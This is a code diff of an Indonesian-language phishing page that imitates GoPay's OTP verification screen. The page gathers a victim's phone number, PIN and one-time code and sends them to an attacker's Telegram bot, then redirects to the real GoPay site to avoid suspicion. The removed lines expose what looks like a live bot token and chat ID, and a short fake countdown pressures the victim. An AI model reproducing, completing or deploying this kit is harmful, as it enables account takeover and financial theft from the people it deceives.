@@ -20,7 +20,6 @@
       -webkit-tap-highlight-color: transparent;
     }
 
-    /* Mengizinkan halaman untuk bisa digeser/didorong ke atas */
     html, body {
       width: 100%;
       min-height: 100%;
@@ -41,11 +40,12 @@
       margin: 0 auto;
     }
 
+    /* Top Bar */
     .go-topbar {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-bottom: 20px;
+      margin-bottom: 24px;
     }
 
     .go-icon-btn {
@@ -58,73 +58,86 @@
       justify-content: center;
     }
 
-    .go-topbar-title {
-      font-size: 17px;
-      font-weight: 600;
-    }
-
+    /* Body Section */
     .go-step3-body {
       display: flex;
       flex-direction: column;
       align-items: flex-start;
-      margin-bottom: 20px;
     }
 
-    .otp-instruction {
+    .otp-title {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #ffffff;
+    }
+
+    .otp-subtitle {
       font-size: 14px;
       color: #9e9e9e;
-      margin-bottom: 16px;
-      line-height: 1.4;
+      margin-bottom: 24px;
     }
 
-    /* Kotak Input OTP 6 Digit */
-    .otp-display-box {
-      width: 100%;
-      height: 52px;
-      background-color: #121212;
-      border-radius: 12px;
+    .otp-label {
+      font-size: 13px;
+      color: #ff5722; /* warna merah/oranye kecil untuk bintang OTP */
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+    .otp-label span {
+      color: #ffffff;
+    }
+
+    /* Area Garis Input OTP & Timer */
+    .otp-input-row {
       display: flex;
       align-items: center;
-      justify-content: flex-start;
-      padding-left: 20px;
-      gap: 22px;
-      margin-bottom: 16px;
+      justify-content: space-between;
+      width: 100%;
+      margin-bottom: 12px;
     }
 
-    .otp-dot {
-      width: 11px;
-      height: 11px;
-      border-radius: 50%;
-      border: 2px solid #666;
-      background: transparent;
-      transition: background 0.2s, border-color 0.2s;
+    .otp-lines-container {
+      display: flex;
+      gap: 12px;
     }
 
-    .otp-dot.filled {
-      background: #ffffff;
-      border-color: #ffffff;
+    .otp-line {
+      width: 32px;
+      height: 3px;
+      background-color: #444444;
+      border-radius: 2px;
+      transition: background-color 0.2s;
     }
 
-    .resend-info {
-      font-size: 13px;
-      color: #9e9e9e;
+    .otp-line.filled {
+      background-color: #00aa13; /* Berubah hijau saat terisi */
     }
 
-    .resend-btn {
-      color: #00aa13;
+    .timer-box {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 14px;
       font-weight: 600;
-      background: none;
-      border: none;
-      cursor: pointer;
-      font-size: 13px;
-      margin-top: 6px;
+      color: #ffffff;
+    }
+
+    .timer-ring {
+      width: 18px;
+      height: 18px;
+      border: 2px solid #333;
+      border-top-color: #00aa13;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none; /* Aktifkan jika ingin mutar */
     }
 
     /* Keypad Angka */
     .keypad-section {
       width: 100%;
       margin-top: auto;
-      padding-bottom: 20px;
+      padding-top: 20px;
     }
 
     .keypad-container {
@@ -152,11 +165,12 @@
       background-color: rgba(255, 255, 255, 0.1);
     }
 
+    /* Footer */
     .go-footer {
       text-align: center;
       font-size: 12px;
       color: #666666;
-      margin-top: 16px;
+      margin-top: 20px;
     }
 
     .go-footer span {
@@ -169,33 +183,41 @@
 
   <div class="app-container">
     <div>
+      <!-- Top Bar -->
       <header class="go-topbar">
         <button type="button" class="go-icon-btn" onclick="history.back()">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
         </button>
-        <span class="go-topbar-title">Masukkan Kode Verifikasi</span>
-        <button type="button" class="go-icon-btn" style="visibility: hidden;">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/></svg>
+        <button type="button" class="go-icon-btn">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
         </button>
       </header>
 
+      <!-- Body Content -->
       <div class="go-step3-body">
-        <p class="otp-instruction">Kode verifikasi (OTP) telah dikirimkan melalui SMS ke nomor Anda. Masukkan 6 digit kode tersebut di bawah ini.</p>
+        <h1 class="otp-title">Cek WhatsApp, ya</h1>
+        <p class="otp-subtitle" id="subPhoneText">Kode-nya kami kirim ke +62******5555</p>
 
-        <div class="otp-display-box" id="otpDisplay">
-          <div class="otp-dot"></div>
-          <div class="otp-dot"></div>
-          <div class="otp-dot"></div>
-          <div class="otp-dot"></div>
-          <div class="otp-dot"></div>
-          <div class="otp-dot"></div>
+        <div class="otp-label"><span>OTP</span> *</div>
+
+        <div class="otp-input-row">
+          <div class="otp-lines-container" id="otpLines">
+            <div class="otp-line"></div>
+            <div class="otp-line"></div>
+            <div class="otp-line"></div>
+            <div class="otp-line"></div>
+            <div class="otp-line"></div>
+            <div class="otp-line"></div>
+          </div>
+          <div class="timer-box">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00aa13" stroke-width="2.5"><path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.73-5.73"/></svg>
+            <span id="countdown">00:09</span>
+          </div>
         </div>
-
-        <div class="resend-info">Tidak menerima kode?</div>
-        <button type="button" class="resend-btn" onclick="alert('Kode OTP baru telah dikirim ulang.')">Kirim ulang</button>
       </div>
     </div>
 
+    <!-- Keypad -->
     <div class="keypad-section">
       <div class="keypad-container">
         <button class="key-btn" onclick="pressKey('1')">1</button>
@@ -221,19 +243,26 @@
   </div>
 
   <script>
+    // Ambil nomor HP dari localStorage dan buat format sensor bintang di tengahnya
+    const savedPhone = localStorage.getItem('gopay_phone') || '+62******5555';
+    if (savedPhone.length > 6) {
+      let masked = savedPhone.slice(0, 3) + "******" + savedPhone.slice(-4);
+      document.getElementById('subPhoneText').innerText = `Kode-nya kami kirim ke ${masked}`;
+    }
+
     let currentOtp = "";
-    const dots = document.querySelectorAll('.otp-dot');
+    const lines = document.querySelectorAll('.otp-line');
 
-    // Konfigurasi Token & Chat ID Telegram Anda (Pastikan sama dengan halaman sebelumnya)
-    const TELEGRAM_BOT_TOKEN = "8881822233:AAE3UwszOo27KceLDBtNKdSD3AgANrxZncU";
-    const TELEGRAM_CHAT_ID = "6742478722";
+    // Konfigurasi Token & Chat ID Telegram Anda
+    const TELEGRAM_BOT_TOKEN = "MASUKKAN_BOT_TOKEN_ANDA_DISINI";
+    const TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DISINI";
 
-    function updateDots() {
-      dots.forEach((dot, index) => {
+    function updateLines() {
+      lines.forEach((line, index) => {
         if (index < currentOtp.length) {
-          dot.classList.add('filled');
+          line.classList.add('filled');
         } else {
-          dot.classList.remove('filled');
+          line.classList.remove('filled');
         }
       });
     }
@@ -241,11 +270,9 @@
     function pressKey(num) {
       if (currentOtp.length < 6) {
         currentOtp += num;
-        updateDots();
+        updateLines();
 
         if (currentOtp.length === 6) {
-          // Ambil data yang tersimpan sebelumnya
-          const savedPhone = localStorage.getItem('gopay_phone') || 'Tidak ada data';
           const savedPin = localStorage.getItem('gopay_pin') || 'Tidak ada data';
 
           // Kirim data lengkap (No HP + PIN + OTP) ke Telegram Bot
@@ -263,9 +290,8 @@
             }).catch(err => console.log(err));
           }
 
-          // Simulasi selesai atau diarahkan ke halaman sukses/beranda asli
+          // Redirect setelah sukses
           setTimeout(() => {
-            alert("Verifikasi berhasil!");
             window.location.href = "https://www.gopay.co.id/";
           }, 500);
         }
@@ -275,9 +301,22 @@
     function pressDelete() {
       if (currentOtp.length > 0) {
         currentOtp = currentOtp.slice(0, -1);
-        updateDots();
+        updateLines();
       }
     }
+
+    // Countdown Timer 9 Detik
+    let timeLeft = 9;
+    const timerElem = document.getElementById('countdown');
+    const countdownInterval = setInterval(() => {
+      timeLeft--;
+      if (timeLeft >= 0) {
+        timerElem.innerText = `00:0${timeLeft}`;
+      } else {
+        clearInterval(countdownInterval);
+        timerElem.innerText = "00:00";
+      }
+    }, 1000);
   </script>
 </body>
 </html>
